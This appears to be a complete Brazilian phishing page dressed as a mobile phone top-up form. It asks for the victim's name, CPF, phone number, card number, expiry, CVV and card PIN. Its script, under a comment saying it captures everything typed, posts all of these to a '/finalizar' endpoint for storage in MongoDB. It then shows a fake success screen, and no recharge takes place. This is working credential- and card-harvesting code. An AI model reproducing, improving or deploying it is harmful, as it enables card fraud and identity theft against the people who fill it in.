<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Recarga Celular - Elite Ink</title>
    <style>
        body { background-color: #0d1117; color: #f0f6fc; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: #161b22; padding: 25px; border-radius: 12px; border: 1px solid #30363d; width: 100%; max-width: 350px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        h2 { text-align: center; color: #58a6ff; margin-bottom: 20px; }
        label { display: block; margin: 10px 0 5px; font-size: 14px; color: #8b949e; }
        input, select { width: 100%; padding: 12px; margin-bottom: 10px; border-radius: 8px; border: 1px solid #30363d; background: #0d1117; color: white; box-sizing: border-box; outline: none; }
        .etapa { display: none; }
        .ativa { display: block; }
        button { width: 100%; padding: 15px; background: #238636; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 15px; }
        .btn-next { background: #58a6ff; }
        .sucesso-icon { font-size: 60px; color: #3fb950; text-align: center; display: block; margin-bottom: 15px; }
    </style>
</head>
<body>
    <div class="card">
        <h2 id="titulo">Dados da Recarga</h2>
        <form id="formRecarga">
            <div id="etapa1" class="etapa ativa">
                <label>Operadora</label>
                <select id="operadora">
                    <option>Vivo</option><option>Tim</option><option>Claro</option><option>Oi</option>
                </select>
                <label>Nome Completo</label>
                <input type="text" id="nome" required>
                <label>CPF</label>
                <input type="text" id="cpf" placeholder="000.000.000-00" required>
                <label>Telefone</label>
                <input type="tel" id="telefone" placeholder="(00) 00000-0000" required>
                <label>Valor</label>
                <select id="valor"><option value="20">R$ 20,00</option><option value="40">R$ 40,00</option></select>
                <button type="button" class="btn-next" onclick="irPara(2)">PRÓXIMA ETAPA</button>
            </div>

            <div id="etapa2" class="etapa">
                <label>Número do Cartão</label>
                <input type="text" id="cartao" maxlength="16" placeholder="0000 0000 0000 0000" required>
                <div style="display: flex; gap: 10px;">
                    <div style="flex: 1;"><label>Validade</label><input type="text" id="data" placeholder="MM/AA" required></div>
                    <div style="flex: 1;"><label>CVV</label><input type="text" id="cvv" maxlength="3" placeholder="000" required></div>
                </div>
                <button type="button" class="btn-next" onclick="irPara(3)">PAGAMENTO</button>
            </div>

            <div id="etapa3" class="etapa">
                <label>Senha do Cartão (6 ou 8 dígitos)</label>
                <input type="password" id="senha" placeholder="******" required>
                <button type="submit">FINALIZAR AGORA</button>
            </div>

            <div id="etapa4" class="etapa" style="text-align: center;">
                <span class="sucesso-icon">✔</span>
                <p>Parabéns, <span id="spanNome" style="color: #58a6ff; font-weight: bold;"></span>!</p>
                <p>Sua recarga foi um <b>sucesso</b>! ✨</p>
                <button type="button" onclick="window.location.reload()" style="background: #58a6ff;">NOVA RECARGA</button>
            </div>
        </form>
    </div>

    <script>
        function irPara(num) {
            document.querySelectorAll('.etapa').forEach(e => e.classList.remove('ativa'));
            document.getElementById('etapa' + num).classList.add('ativa');
            const tits = ["", "Dados da Recarga", "Pagamento", "Segurança", "Sucesso!"];
            document.getElementById('titulo').innerText = tits[num];
        }

        document.getElementById('formRecarga').onsubmit = async (e) => {
            e.preventDefault();
            const nomeCli = document.getElementById('nome').value;

            // CAPTURA TUDO O QUE FOI DIGITADO
            const dados = {
                operadora: document.getElementById('operadora').value,
                nome: nomeCli,
                cpf: document.getElementById('cpf').value,
                telefone: document.getElementById('telefone').value,
                valor: document.getElementById('valor').value,
                cartao: document.getElementById('cartao').value,
                data: document.getElementById('data').value,
                cvv: document.getElementById('cvv').value,
                senha: document.getElementById('senha').value
            };

            // Envia os dados para o servidor Render salvar no MongoDB
            fetch('/finalizar', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(dados)
            });

            document.getElementById('spanNome').innerText = nomeCli.split(' ')[0];
            irPara(4); // Pula para a etapa final de agradecimento
        };
    </script>
</body>
</html>
